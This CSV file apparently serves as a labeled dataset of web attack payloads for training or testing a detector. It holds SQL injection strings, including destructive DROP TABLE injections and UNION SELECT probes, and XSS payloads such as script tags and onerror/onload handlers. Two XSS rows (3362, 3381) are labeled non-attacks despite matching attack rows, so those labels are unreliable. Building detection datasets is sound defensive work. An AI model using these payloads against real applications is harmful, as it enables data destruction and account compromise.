id,description,payload,context,example_query,is_attack,attack_type
3242,SQL Injection attempt (blended),search?q=test' OR 'SH8HEhKC'='qAbtZ0y4,Database Interaction,Injected SQL,Yes,SQLi
3243,SQL Injection attempt (blended),"uid=11225 UNION SELECT 28181,'GCmGYLTW'",Database Interaction,Injected SQL,Yes,SQLi
3244,SQL Injection attempt (blended),product?id=9094 OR EXISTS(SELECT * FROM users),Database Interaction,Injected SQL,Yes,SQLi
3245,SQL Injection attempt (blended),' AND 94682=49931 -- Fr5FwSXr,Database Interaction,Injected SQL,Yes,SQLi
3246,SQL Injection attempt (blended),id=92784 OR 80543=75129,Database Interaction,Injected SQL,Yes,SQLi
3247,SQL Injection attempt (blended),"uid=25296 UNION SELECT 50936,'KX4ImUHZ'",Database Interaction,Injected SQL,Yes,SQLi
3248,SQL Injection attempt (blended),search?q=test' OR 'VrAomxYq'='dRDGyJRq,Database Interaction,Injected SQL,Yes,SQLi
3249,SQL Injection attempt (blended),"uid=23054 UNION SELECT 48466,'1LoXelsl'",Database Interaction,Injected SQL,Yes,SQLi
3250,SQL Injection attempt (blended),product?id=59745 OR EXISTS(SELECT * FROM users),Database Interaction,Injected SQL,Yes,SQLi
3251,SQL Injection attempt (blended),product?id=77722 OR EXISTS(SELECT * FROM users),Database Interaction,Injected SQL,Yes,SQLi
3252,SQL Injection attempt (blended),"uid=5275 UNION SELECT 65186,'jJ82o37m'",Database Interaction,Injected SQL,Yes,SQLi
3253,SQL Injection attempt (blended),id=77936 OR 73473=22578,Database Interaction,Injected SQL,Yes,SQLi
3254,SQL Injection attempt (blended),search?q=test' OR 'w3DQs4Xp'='cPNw6iWl,Database Interaction,Injected SQL,Yes,SQLi
3255,SQL Injection attempt (blended),category=hSsgHEwr'; DROP TABLE temp_WzDA4EWI;--,Database Interaction,Injected SQL,Yes,SQLi
3256,SQL Injection attempt (blended),category=41JI54B9'; DROP TABLE temp_yZMRwJtx;--,Database Interaction,Injected SQL,Yes,SQLi
3257,SQL Injection attempt (blended),' AND 98647=72934 -- kRWXKxfL,Database Interaction,Injected SQL,Yes,SQLi
3258,SQL Injection attempt (blended),id=88044 OR 80436=83304,Database Interaction,Injected SQL,Yes,SQLi
3259,SQL Injection attempt (blended),id=50099 OR 83648=43658,Database Interaction,Injected SQL,Yes,SQLi
3260,SQL Injection attempt (blended),product?id=68514 OR EXISTS(SELECT * FROM users),Database Interaction,Injected SQL,Yes,SQLi
3261,SQL Injection attempt (blended),product?id=93973 OR EXISTS(SELECT * FROM users),Database Interaction,Injected SQL,Yes,SQLi
3262,SQL Injection attempt (blended),"uid=19257 UNION SELECT 1421,'7D0VRhp3'",Database Interaction,Injected SQL,Yes,SQLi
3263,SQL Injection attempt (blended),id=11139 OR 82645=58828,Database Interaction,Injected SQL,Yes,SQLi
3264,SQL Injection attempt (blended),' AND 12333=57352 -- vQXQQv4s,Database Interaction,Injected SQL,Yes,SQLi
3265,SQL Injection attempt (blended),category=e7NyqNx9'; DROP TABLE temp_sPRrCJjQ;--,Database Interaction,Injected SQL,Yes,SQLi
3266,SQL Injection attempt (blended),id=98758 OR 79773=66732,Database Interaction,Injected SQL,Yes,SQLi
3267,SQL Injection attempt (blended),product?id=4856 OR EXISTS(SELECT * FROM users),Database Interaction,Injected SQL,Yes,SQLi
3268,SQL Injection attempt (blended),search?q=test' OR 'l9ag1EgV'='32Vh8MYz,Database Interaction,Injected SQL,Yes,SQLi
3269,SQL Injection attempt (blended),category=OmCiAaMG'; DROP TABLE temp_dWIfhK50;--,Database Interaction,Injected SQL,Yes,SQLi
3270,SQL Injection attempt (blended),"uid=3783 UNION SELECT 6898,'GT3qDriF'",Database Interaction,Injected SQL,Yes,SQLi
3271,SQL Injection attempt (blended),search?q=test' OR 'X8turGNq'='mYyh4nlN,Database Interaction,Injected SQL,Yes,SQLi
3272,SQL Injection attempt (blended),category=3HZ2arsB'; DROP TABLE temp_i9ckgjkr;--,Database Interaction,Injected SQL,Yes,SQLi
3273,SQL Injection attempt (blended),id=40715 OR 80682=57234,Database Interaction,Injected SQL,Yes,SQLi
3274,SQL Injection attempt (blended),search?q=test' OR 'Rm8wmR6W'='sUyRU3xc,Database Interaction,Injected SQL,Yes,SQLi
3275,SQL Injection attempt (blended),"uid=22246 UNION SELECT 8564,'OJQ5tIxK'",Database Interaction,Injected SQL,Yes,SQLi
3276,SQL Injection attempt (blended),"uid=60286 UNION SELECT 49917,'lum9nyLF'",Database Interaction,Injected SQL,Yes,SQLi
3277,SQL Injection attempt (blended),category=Rm9p4lpo'; DROP TABLE temp_PbcKPVuM;--,Database Interaction,Injected SQL,Yes,SQLi
3278,SQL Injection attempt (blended),category=W0rKAw7F'; DROP TABLE temp_v7JOkCZP;--,Database Interaction,Injected SQL,Yes,SQLi
3279,SQL Injection attempt (blended),search?q=test' OR 'AQ4ip26e'='kx8Nphfe,Database Interaction,Injected SQL,Yes,SQLi
3280,SQL Injection attempt (blended),"uid=50820 UNION SELECT 55127,'yO6kbM5F'",Database Interaction,Injected SQL,Yes,SQLi
3281,SQL Injection attempt (blended),product?id=43439 OR EXISTS(SELECT * FROM users),Database Interaction,Injected SQL,Yes,SQLi
3282,SQL Injection attempt (blended),"uid=88056 UNION SELECT 39424,'UGZDZOMg'",Database Interaction,Injected SQL,Yes,SQLi
3283,SQL Injection attempt (blended),' AND 52118=39696 -- 8IAr3KfI,Database Interaction,Injected SQL,Yes,SQLi
3284,SQL Injection attempt (blended),category=QflkeI2A'; DROP TABLE temp_bwwdxTMt;--,Database Interaction,Injected SQL,Yes,SQLi
3285,SQL Injection attempt (blended),category=5B5wARi0'; DROP TABLE temp_5My4Kqnq;--,Database Interaction,Injected SQL,Yes,SQLi
3286,SQL Injection attempt (blended),product?id=62762 OR EXISTS(SELECT * FROM users),Database Interaction,Injected SQL,Yes,SQLi
3287,SQL Injection attempt (blended),"uid=3659 UNION SELECT 74621,'FwE3LPkg'",Database Interaction,Injected SQL,Yes,SQLi
3288,SQL Injection attempt (blended),"uid=16778 UNION SELECT 61690,'a1vORzul'",Database Interaction,Injected SQL,Yes,SQLi
3289,SQL Injection attempt (blended),product?id=5696 OR EXISTS(SELECT * FROM users),Database Interaction,Injected SQL,Yes,SQLi
3290,SQL Injection attempt (blended),product?id=8056 OR EXISTS(SELECT * FROM users),Database Interaction,Injected SQL,Yes,SQLi
3291,SQL Injection attempt (blended),"uid=66244 UNION SELECT 66278,'cCDBvFo1'",Database Interaction,Injected SQL,Yes,SQLi
3292,SQL Injection attempt (blended),"uid=67898 UNION SELECT 94670,'1fW3yZqC'",Database Interaction,Injected SQL,Yes,SQLi
3293,SQL Injection attempt (blended),"uid=40240 UNION SELECT 40085,'ZHqqDLtp'",Database Interaction,Injected SQL,Yes,SQLi
3294,SQL Injection attempt (blended),category=DoTo1CLP'; DROP TABLE temp_wQJJVEWO;--,Database Interaction,Injected SQL,Yes,SQLi
3295,SQL Injection attempt (blended),' AND 39292=23073 -- sxrnolqp,Database Interaction,Injected SQL,Yes,SQLi
3296,SQL Injection attempt (blended),' AND 25191=84399 -- Bri0A0zh,Database Interaction,Injected SQL,Yes,SQLi
3297,SQL Injection attempt (blended),search?q=test' OR 'Uoqr8S5z'='DacEJH51,Database Interaction,Injected SQL,Yes,SQLi
3298,SQL Injection attempt (blended),id=36448 OR 32849=45304,Database Interaction,Injected SQL,Yes,SQLi
3299,SQL Injection attempt (blended),"uid=99453 UNION SELECT 85228,'5RfrNdX7'",Database Interaction,Injected SQL,Yes,SQLi
3300,SQL Injection attempt (blended),' AND 88638=9016 -- ihQ0U5c0,Database Interaction,Injected SQL,Yes,SQLi
3301,Cross-Site Scripting (blended),comment=<script>alert(88028)</script>,Client-side Execution,Injected Script,Yes,XSS
3302,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(32401)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3303,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(29021)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3304,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(10966)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3305,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('ZVUxt60D')>,Client-side Execution,Injected Script,Yes,XSS
3306,Cross-Site Scripting (blended),comment=<script>alert(83050)</script>,Client-side Execution,Injected Script,Yes,XSS
3307,Cross-Site Scripting (blended),about=<b onclick=alert('NeCLOnLB')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3308,Cross-Site Scripting (blended),about=<b onclick=alert('FSJiCdJj')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3309,Cross-Site Scripting (blended),profile=<svg/onload=alert(14309)>,Client-side Execution,Injected Script,Yes,XSS
3310,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('iRA8sho8')>,Client-side Execution,Injected Script,Yes,XSS
3311,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('OSXfZVTU')>,Client-side Execution,Injected Script,Yes,XSS
3312,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(87278)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3313,Cross-Site Scripting (blended),about=<b onclick=alert('jRgCKUAq')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3314,Cross-Site Scripting (blended),about=<b onclick=alert('A1HzkRkc')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3315,Cross-Site Scripting (blended),comment=<script>alert(85848)</script>,Client-side Execution,Injected Script,Yes,XSS
3316,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(43818)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3317,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(53389)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3318,Cross-Site Scripting (blended),profile=<svg/onload=alert(68648)>,Client-side Execution,Injected Script,Yes,XSS
3319,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(35781)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3320,Cross-Site Scripting (blended),comment=<script>alert(12245)</script>,Client-side Execution,Injected Script,Yes,XSS
3321,Cross-Site Scripting (blended),comment=<script>alert(60913)</script>,Client-side Execution,Injected Script,Yes,XSS
3322,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('BG1JuHLy')>,Client-side Execution,Injected Script,Yes,XSS
3323,Cross-Site Scripting (blended),comment=<script>alert(6584)</script>,Client-side Execution,Injected Script,Yes,XSS
3324,Cross-Site Scripting (blended),about=<b onclick=alert('qudUFVYp')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3325,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(32703)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3326,Cross-Site Scripting (blended),profile=<svg/onload=alert(37019)>,Client-side Execution,Injected Script,Yes,XSS
3327,Cross-Site Scripting (blended),comment=<script>alert(34646)</script>,Client-side Execution,Injected Script,Yes,XSS
3328,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('7N77z7Q1')>,Client-side Execution,Injected Script,Yes,XSS
3329,Cross-Site Scripting (blended),comment=<script>alert(69517)</script>,Client-side Execution,Injected Script,Yes,XSS
3330,Cross-Site Scripting (blended),about=<b onclick=alert('IkMEPO2j')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3331,Cross-Site Scripting (blended),profile=<svg/onload=alert(12545)>,Client-side Execution,Injected Script,Yes,XSS
3332,Cross-Site Scripting (blended),comment=<script>alert(67268)</script>,Client-side Execution,Injected Script,Yes,XSS
3333,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('2aRl9tjX')>,Client-side Execution,Injected Script,Yes,XSS
3334,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(42881)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3335,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('D2EVC8lT')>,Client-side Execution,Injected Script,Yes,XSS
3336,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(96027)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3337,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(32115)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3338,Cross-Site Scripting (blended),about=<b onclick=alert('1vChEIKA')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3339,Cross-Site Scripting (blended),comment=<script>alert(51196)</script>,Client-side Execution,Injected Script,Yes,XSS
3340,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(44522)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3341,Cross-Site Scripting (blended),comment=<script>alert(46566)</script>,Client-side Execution,Injected Script,Yes,XSS
3342,Cross-Site Scripting (blended),about=<b onclick=alert('VzCtZSz0')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3343,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(75476)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3344,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(3616)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3345,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(22930)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3346,Cross-Site Scripting (blended),profile=<svg/onload=alert(35290)>,Client-side Execution,Injected Script,Yes,XSS
3347,Cross-Site Scripting (blended),profile=<svg/onload=alert(32201)>,Client-side Execution,Injected Script,Yes,XSS
3348,Cross-Site Scripting (blended),comment=<script>alert(26193)</script>,Client-side Execution,Injected Script,Yes,XSS
3349,Cross-Site Scripting (blended),comment=<script>alert(5332)</script>,Client-side Execution,Injected Script,Yes,XSS
3350,Cross-Site Scripting (blended),comment=<script>alert(64932)</script>,Client-side Execution,Injected Script,Yes,XSS
3351,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(49757)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3352,Cross-Site Scripting (blended),profile=<svg/onload=alert(82811)>,Client-side Execution,Injected Script,Yes,XSS
3353,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(66438)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3354,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('n2BDbJYT')>,Client-side Execution,Injected Script,Yes,XSS
3355,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('IHRgwxmp')>,Client-side Execution,Injected Script,Yes,XSS
3356,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('OIT3c0eA')>,Client-side Execution,Injected Script,Yes,XSS
3357,Cross-Site Scripting (blended),about=<b onclick=alert('xoCgJaFo')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3358,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(23815)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3359,Cross-Site Scripting (blended),comment=<script>alert(81382)</script>,Client-side Execution,Injected Script,Yes,XSS
3360,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(23175)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3361,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('9GAz501j')>,Client-side Execution,Injected Script,Yes,XSS
3362,Cross-Site Scripting (blended),profile=<svg/onload=alert(92940)>,Client-side Execution,Injected Script,No,
3363,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('XorEncKS')>,Client-side Execution,Injected Script,Yes,XSS
3364,Cross-Site Scripting (blended),profile=<svg/onload=alert(61163)>,Client-side Execution,Injected Script,Yes,XSS
3365,Cross-Site Scripting (blended),comment=<script>alert(46836)</script>,Client-side Execution,Injected Script,Yes,XSS
3366,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('3td94yt9')>,Client-side Execution,Injected Script,Yes,XSS
3367,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(18510)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3368,Cross-Site Scripting (blended),profile=<svg/onload=alert(60717)>,Client-side Execution,Injected Script,Yes,XSS
3369,Cross-Site Scripting (blended),profile=<svg/onload=alert(87048)>,Client-side Execution,Injected Script,Yes,XSS
3370,Cross-Site Scripting (blended),profile=<svg/onload=alert(83099)>,Client-side Execution,Injected Script,Yes,XSS
3371,Cross-Site Scripting (blended),comment=<script>alert(50571)</script>,Client-side Execution,Injected Script,Yes,XSS
3372,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(40454)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3373,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('Ido9cJ2g')>,Client-side Execution,Injected Script,Yes,XSS
3374,Cross-Site Scripting (blended),comment=<script>alert(68541)</script>,Client-side Execution,Injected Script,Yes,XSS
3375,Cross-Site Scripting (blended),comment=<script>alert(22236)</script>,Client-side Execution,Injected Script,Yes,XSS
3376,Cross-Site Scripting (blended),profile=<svg/onload=alert(12461)>,Client-side Execution,Injected Script,Yes,XSS
3377,Cross-Site Scripting (blended),about=<b onclick=alert('f1OIp5p0')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3378,Cross-Site Scripting (blended),profile=<svg/onload=alert(62971)>,Client-side Execution,Injected Script,Yes,XSS
3379,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('I15hApMm')>,Client-side Execution,Injected Script,Yes,XSS
3380,Cross-Site Scripting (blended),profile=<svg/onload=alert(93872)>,Client-side Execution,Injected Script,Yes,XSS
3381,Cross-Site Scripting (blended),about=<b onclick=alert('KjxBrZ5F')>Hello</b>,Client-side Execution,Injected Script,No,
3382,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(32574)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3383,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(26167)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3384,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('tPALlv1k')>,Client-side Execution,Injected Script,Yes,XSS
3385,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(27473)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3386,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(84504)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3387,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(6493)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3388,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(22061)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3389,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(19158)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3390,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(82541)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3391,Cross-Site Scripting (blended),profile=<svg/onload=alert(79003)>,Client-side Execution,Injected Script,Yes,XSS
3392,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('oII6rvVG')>,Client-side Execution,Injected Script,Yes,XSS
3393,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('pss7XPSj')>,Client-side Execution,Injected Script,Yes,XSS
3394,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(61929)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3395,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(12380)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3396,Cross-Site Scripting (blended),profile=<svg/onload=alert(55611)>,Client-side Execution,Injected Script,Yes,XSS
3397,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('yaRAiTyh')>,Client-side Execution,Injected Script,Yes,XSS
